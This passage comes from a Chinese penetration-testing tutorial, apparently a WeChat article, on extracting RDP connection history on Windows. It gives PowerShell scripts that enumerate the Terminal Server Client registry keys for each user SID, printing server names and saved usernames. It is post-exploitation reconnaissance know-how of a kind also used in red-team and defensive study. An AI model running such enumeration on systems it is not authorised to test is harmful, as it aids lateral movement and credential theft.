style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$RegPath </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$QueryPath </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> dir $RegPath </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">foreach</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$Name </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">in</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $QueryPath</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">   </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Try</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        $User </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ItemProperty</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Path</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $RegPath$Name </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ErrorAction</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Stop</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">|</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Out</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Null</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">UsernameHint</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Server:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$Name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">            </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"User:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$User</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"`n"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Catch</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"No RDP Connections History"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">导出已登录用户的历史记录</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">已登录用户的注册表信息会同步保存在&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">HKEY_USERS\&lt;SID&gt;</code>&nbsp;目录下，<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">&lt;SID&gt;</code>&nbsp;要对应每个用户的 SID：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5912518853695324" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/5_EKxpFl25ricjg1zgvVbvnUfDM1Zgtw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPzxWwLnRBEm3DzNTgaS2MmDKq1EKxpFl25ricjg1zgvVbvnUfDM1Zgtw/640?wx_fmt=png'" data-type="png" data-w="1326" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524085841555</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可以看到，当前系统登录三个用户，分别有三个子项。我们可以通过枚举注册表键值&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">HKEY_USERS\SID\Software\Microsoft\Terminal Server Client\Servers</code>&nbsp;就能够获得已登录用户的远程桌面连接历史记录：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5968349660889224" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/6_Msr3KsiaDbSR789FujjagnOJJSxeyg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPLWEsPUg960iaMo5Hfmxx0zMsWTMsr3KsiaDbSR789FujjagnOJJSxeyg/640?wx_fmt=png'" data-type="png" data-w="1327" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524085946713</figcaption></figure><blockquote style="margin: 2em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgba(0, 0, 0, 0.5);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-left: none;padding: 1em;border-radius: 8px;background: rgb(247, 247, 247);"><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1em;letter-spacing: 0.1em;">也就是说，如果当前主机登录了两个用户，那么这两个用户的注册表信息都会保存在&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">HKEY_USERS\&lt;SID&gt;</code>&nbsp;下。但如果第三个用户未登录，此时是无法直接获得该用户的注册表信息的，会报如下错误：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5911477869467366" src="图片/HACK学习呀_2021-08-03_内网渗透｜获取远程桌面连接记录与RDP凭据/7_8lzVAxEFsRQjrALElU8KaybFh1zEsA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9LQkxd9qNoWlOJUt7seZEPSXRwY2pPukqp9vFTAZiaHuiaPy8lzVAxEFsRQjrALElU8KaybFh1zEsA/640?wx_fmt=png'" data-type="png" data-w="1333" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;height: auto !important;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 0.8em;">image-20210524090421662</figcaption></figure><p style="-webkit-tap-highlight-color: transparent;color: rgb(80, 80, 80);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1em;letter-spacing: 0.1em;">也就无法直接导出该用户的远程桌面连接历史记录。</p></blockquote><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">最后给出一个三好学生写的枚举脚本：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);white-space: normal;"><pre data-lang="powershell" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$AllUser </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Get</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">WmiObject</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Win32_UserAccount</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">foreach</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$User </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">in</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $AllUser</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    $RegPath </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Registry::HKEY_USERS\"+$User.SID+"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Software\Microsoft\Terminal </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Server</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Client</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">\Servers\"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"User:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$User</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Name</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"SID:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$User</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">SID</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Write</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Host</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Status:"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$User</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Status</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">    </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Try</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">        $QueryPath </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> dir $RegPath </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: 